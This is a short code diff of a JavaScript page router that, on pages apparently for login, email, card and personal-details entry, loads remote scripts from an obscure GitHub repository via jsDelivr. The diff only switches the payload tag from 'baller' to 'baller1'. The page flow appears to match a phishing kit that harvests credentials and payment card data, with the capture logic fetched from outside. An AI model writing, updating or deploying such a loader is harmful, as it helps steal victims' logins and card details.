@@ -1,18 +1,18 @@
 //https://cdn.jsdelivr.net/gh/jmresult/zelpae@lover/js/production/Redux/actions.js
 if (is_current_page('MainPath')) {
-    Default("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller/js/production/Redux/actions.js", "")
+    Default("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller1/js/production/Redux/actions.js", "")
     checkLoaded()
 } else if (is_current_page('LPath')) {
-    Login("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller/js/production/Redux/actions.js", "")
+    Login("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller1/js/production/Redux/actions.js", "")
     checkLoaded()
 } else if (is_current_page('EPath')) {
-    Email("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller/js/production/Redux/actions.js", "")
+    Email("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller1/js/production/Redux/actions.js", "")
     checkLoaded()
 } else if (is_current_page('CPath')) {
-    Card("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller/js/production/Redux/actions.js", "")
+    Card("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller1/js/production/Redux/actions.js", "")
     checkLoaded()
 } else if (is_current_page('DPath')) {
-    Details("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller/js/production/Redux/actions.js", "")
+    Details("https://cdn.jsdelivr.net/gh/jmresult/zelpae@baller1/js/production/Redux/actions.js", "")
     checkLoaded()
 }
 
